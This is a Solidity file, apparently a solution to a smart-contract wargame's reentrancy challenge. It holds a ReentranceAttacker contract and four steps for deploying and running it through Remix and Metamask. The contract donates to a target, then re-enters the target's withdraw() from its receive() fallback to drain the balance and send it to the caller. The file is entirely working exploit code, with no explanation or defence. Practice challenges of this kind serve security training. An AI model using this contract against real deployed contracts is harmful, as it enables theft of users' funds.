// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - Call deposit() function of attacker contract - Metamask
// 3 - Check balance - await getBalance(instance) - Chrome Console
// 4 - Call attack() function of attacker contract - Metamask

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IRentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    IRentrance public rentrance;
    uint256 public maxBalance;

    constructor(address challengeAddress) public payable {
        rentrance = IRentrance(challengeAddress);
        maxBalance = address(rentrance).balance;
    }

    receive() external payable {
        // totalBalance += msg.value;
        // require(totalBalance <= maxBalance, "contract empty");
        rentrance.withdraw(maxBalance);
    }

    function deposit() external payable {
        // call reentrance contract with sender address
        require(msg.value == maxBalance, "send exact balance");
        rentrance.donate.value(msg.value)(address(this));
    }

    function attack() external {
        rentrance.withdraw(maxBalance);
        msg.sender.transfer(address(this).balance);
    }
}
